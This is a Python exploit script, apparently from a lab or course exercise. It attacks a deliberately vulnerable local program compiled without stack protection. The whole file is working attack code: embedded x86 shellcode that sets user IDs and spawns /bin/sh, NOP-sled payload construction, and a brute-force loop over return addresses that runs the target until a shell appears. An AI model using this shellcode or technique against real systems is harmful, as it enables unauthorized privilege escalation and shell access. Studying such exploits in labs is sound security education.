import subprocess
import struct

shellcode = (
    b"\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\xa4\xb3\x1f\xb1\x1f\xb2\x1f"
    b"\xcd\x80\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c"
    b"\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8"
    b"\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh"
)

stack_start = 0xffffd4cc
ebp_offset = 44
eip_offset = 48

def run_exploit(payload):
    print(f"[*] Trying payload: {payload}")
    
    try:
        # Write the payload to a file
        with open("../targets/payload", "wb") as f:
            f.write(payload)
        
        # Run the target program with the payload
        p = subprocess.Popen(["../targets/target1", "payload"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output, error = p.communicate()
        
        # Check if the exploit was successful
        if b"targetuser" in output:
            print(f"[+] Exploit succeeded with payload: {payload}")
            print(output.decode())
            return True
        
        # Print any error messages
        if error:
            print(f"[-] Error: {error.decode().strip()}")
        
    except Exception as e:
        print(f"[-] Exception occurred: {str(e)}")
    
    return False

def build_payload(nop_length, eip_offset):
    nop_sled = b"\x90" * nop_length
    eip_address = struct.pack("<I", stack_start + eip_offset)
    
    padding_length = ebp_offset - len(nop_sled) - len(shellcode)
    if padding_length < 0:
        return None
    
    padding = b"A" * padding_length
    
    payload = nop_sled + shellcode + padding + b"BBBB" + b"A" * (eip_offset - ebp_offset - 4) + eip_address
    return payload

def brute_force():
    # Define the range of offsets and addresses to test
    offset_range = range(0, 1000, 4)  # Increased the range to 1000
    addr_range = range(-1000, 1000, 4)  # Expanded the address range
    
    for offset in offset_range:
        for addr in addr_range:
            payload = build_payload(offset, addr)
            if payload is None:
                continue
            
            if run_exploit(payload):
                return
    
    print("[-] Exploit failed. No suitable offset and address found.")

if __name__ == "__main__":
    print("[*] Starting brute-force analysis...")
    
    # Compile the target program
    print("[*] Compiling the target program...")
    subprocess.run(["gcc", "-g", "-fno-stack-protector", "-z", "execstack", "-m32", "-o", "../targets/target1", "../targets/target1.c"])
    print("[+] Target program compiled.")
    
    brute_force()
    print("[*] Brute-force analysis completed.")